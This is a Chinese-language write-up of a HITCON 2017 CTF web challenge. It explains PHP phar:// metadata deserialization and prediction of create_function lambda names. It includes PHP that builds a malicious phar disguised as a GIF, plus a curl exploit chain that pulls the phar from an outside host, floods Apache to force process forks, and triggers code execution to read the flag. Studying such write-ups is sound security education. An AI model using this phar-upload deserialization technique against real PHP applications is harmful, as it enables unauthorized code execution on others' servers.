# baby^h-master-php-2017

> 分类：Web

## 题目描述

Orange 出的 0day 题（phar 反序列化），整场比赛无人解出。通过 phar:// 协议读取触发 metadata 反序列化，构造 Admin 类执行 create_function 获取 flag。

## 考察知识点

- phar 反序列化（phar:// 协议读取时反序列化 metadata，0day）
- create_function 匿名函数命名（\x00lambda_%d）
- Pre-fork Apache fork 新进程使 lambda 计数重置

## 解法

源码关键：

```php
$FLAG = create_function("", 'die(`/read_flag`);');
$SECRET = `/read_secret`;

class Admin extends User {
    function __destruct(){
        eval("function my_function_$random() { global \$FLAG; \$FLAG(); }");
        $_GET["lucky"]();
    }
}
```

**第一个难关：构造反序列化**。`check_session` 用 `hash_hmac` 二进制对比，无法伪造。但 phar 文件在通过 `phar://` 协议读取时，会解析 phar 对象并反序列化其 metadata。利用上传功能（`file_get_contents($_GET["url"] . "/avatar.gif")` 需要 GIF89a 头，phar stub 可设为 GIF89a）上传恶意 phar，再通过 `phar://` 读取触发 Admin 反序列化。

生成 phar：

```php
<?php
class Admin {
    public $avatar = 'orz';
}
$p = new Phar(__DIR__ . '/avatar.phar', 0);
$p['file.php'] = '<?php ?>';
$p->setMetadata(new Admin());
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
rename(__DIR__ . '/avatar.phar', __DIR__ . '/avatar.gif');
?>
```

**第二个难关：预测函数名**。`create_function` 生成的匿名函数名为 `\x00lambda_%d`，`%d` 从 1 递增。通过大量请求迫使 Pre-fork 模式的 Apache fork 新进程，使 `%d` 重置为 1，从而预测为 `\x00lambda_1`。

exp：

```bash
# get a cookie
curl http://host/ --cookie-jar cookie
# download .phar file
curl -b cookie 'http://host/?m=upload&url=http://orange.tw/'
# force apache to fork new process
python fork.py &
# get flag
curl -b cookie "http://host/?m=upload&url=phar:///var/www/data/$MD5_IP/&lucky=%00lambda_1"
```

## 参考答案

（flag 通过触发 Admin 析构函数执行 create_function 读取）

## 来源

- 作者：LoRexxar / Orange | https://lorexxar.cn/2017/11/10/hitcon2017-writeup/
- 官方 writeup：https://github.com/orangetw/My-CTF-Web-Challenges
